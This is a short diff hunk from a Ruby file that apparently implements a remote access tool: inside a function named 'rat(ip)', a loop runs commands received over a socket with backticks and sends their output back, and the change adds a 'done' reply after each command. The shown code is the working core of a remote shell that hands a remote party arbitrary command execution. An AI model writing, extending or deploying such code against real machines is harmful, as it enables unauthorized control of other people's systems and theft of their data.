@@ -14,6 +14,7 @@ def rat(ip)
             break
           end
           socket.puts `#{cmd}`
+          socket.puts 'done'
         end
       end
     end
